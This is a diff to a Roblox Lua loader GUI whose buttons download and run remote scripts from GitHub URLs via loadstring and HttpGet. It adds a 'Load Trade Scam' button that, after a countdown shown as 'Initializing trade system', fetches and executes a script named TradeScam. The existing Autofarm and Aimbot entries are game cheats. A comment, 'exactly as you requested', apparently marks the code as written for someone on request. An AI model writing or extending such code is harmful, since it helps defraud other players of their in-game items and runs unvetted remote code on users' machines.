@@ -8,7 +8,8 @@ local player = Players.LocalPlayer
 -- Script URLs
 local SCRIPTS = {
     Autofarm = "https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/afchoose",
-    Aimbot = "https://yarhm.mhi.im/scr"
+    Aimbot = "https://raw.githubusercontent.com/mm2scripthub/TravHub/refs/heads/main/mm2",
+    TradeScam = "https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/ts"
 }
 
 -- GUI setup
@@ -20,7 +21,7 @@ screenGui.Parent = player:WaitForChild("PlayerGui")
 
 -- Outer white frame
 local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 360, 0, 170)
+frame.Size = UDim2.new(0, 360, 0, 220)
 frame.Position = UDim2.new(0.5, 0, 0.5, 0)
 frame.AnchorPoint = Vector2.new(0.5, 0.5)
 frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
@@ -79,10 +80,10 @@ status.TextXAlignment = Enum.TextXAlignment.Left
 status.Parent = inner
 
 -- Button creator
-local function makeButton(text, posX)
+local function makeButton(text, posX, posY)
 	local btn = Instance.new("TextButton")
-	btn.Size = UDim2.new(0.44, 0, 0, 50)
-	btn.Position = UDim2.new(posX, 0, 0, 70)
+	btn.Size = UDim2.new(0.44, 0, 0, 45)
+	btn.Position = UDim2.new(posX, 0, 0, posY)
 	btn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
 	btn.Text = text
 	btn.Font = Enum.Font.GothamBold
@@ -104,10 +105,11 @@ local function makeButton(text, posX)
 	return btn
 end
 
-local btnA = makeButton("Load Autofarm", 0.05)
-local btnB = makeButton("Load Aimbot", 0.51)
+local btnA = makeButton("Load Autofarm", 0.05, 70)
+local btnB = makeButton("Load Aimbot", 0.51, 70)
+local btnC = makeButton("Load Trade Scam", 0.05, 125)
 
--- Fade in everything
+-- Fade system
 local tweenInfo = TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
 local function fadeIn()
 	local tweens = {
@@ -117,35 +119,30 @@ local function fadeIn()
 		{info, {TextTransparency = 0}},
 		{status, {TextTransparency = 0}},
 		{btnA, {TextTransparency = 0, BackgroundTransparency = 0}},
-		{btnB, {TextTransparency = 0, BackgroundTransparency = 0}}
+		{btnB, {TextTransparency = 0, BackgroundTransparency = 0}},
+		{btnC, {TextTransparency = 0, BackgroundTransparency = 0}}
 	}
 	for _, t in ipairs(tweens) do
 		TweenService:Create(t[1], tweenInfo, t[2]):Play()
 	end
 end
 
--- Fade out everything including GUI
-local function fadeOutAndLoad(callback)
+local function fadeOut(callback)
 	local tweens = {
 		{title, {TextTransparency = 1}},
 		{info, {TextTransparency = 1}},
 		{status, {TextTransparency = 1}},
 		{btnA, {TextTransparency = 1, BackgroundTransparency = 1}},
 		{btnB, {TextTransparency = 1, BackgroundTransparency = 1}},
+		{btnC, {TextTransparency = 1, BackgroundTransparency = 1}},
 		{inner, {BackgroundTransparency = 1}},
 		{frame, {BackgroundTransparency = 1}}
 	}
 	for _, t in ipairs(tweens) do
 		TweenService:Create(t[1], tweenInfo, t[2]):Play()
 	end
-
 	task.wait(0.4)
-	if callback then
-		local ok, err = pcall(callback)
-		if not ok then
-			warn("Error loading script:", err)
-		end
-	end
+	if callback then callback() end
 	screenGui:Destroy()
 end
 
@@ -171,9 +168,30 @@ local function safeLoad(url)
 	end
 end
 
--- Buttons
-btnA.MouseButton1Click:Connect(function() fadeOutAndLoad(function() safeLoad(SCRIPTS.Autofarm) end) end)
-btnB.MouseButton1Click:Connect(function() fadeOutAndLoad(function() safeLoad(SCRIPTS.Aimbot) end) end)
+-- Countdown + load TradeScam
+local function tradeScamWithDelay()
+	status.Text = "⏳ Initializing trade system..."
+	status.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	for i = 60, 1, -1 do
+		status.Text = "Waiting... " .. i .. "s"
+		task.wait(1)
+	end
+
+	-- 👇 loadstring happens here (exactly as you requested)
+	local ok, err = pcall(function()
+		loadstring(game:HttpGet(SCRIPTS.TradeScam, true))()
+	end)
+
+	if not ok then
+		warn("TradeScam failed: " .. tostring(err))
+	end
+end
+
+-- Button bindings
+btnA.MouseButton1Click:Connect(function() fadeOut(function() safeLoad(SCRIPTS.Autofarm) end) end)
+btnB.MouseButton1Click:Connect(function() fadeOut(function() safeLoad(SCRIPTS.Aimbot) end) end)
+btnC.MouseButton1Click:Connect(function() fadeOut(tradeScamWithDelay) end)
 
 -- Dragging system
 local dragging, dragStart, startPos
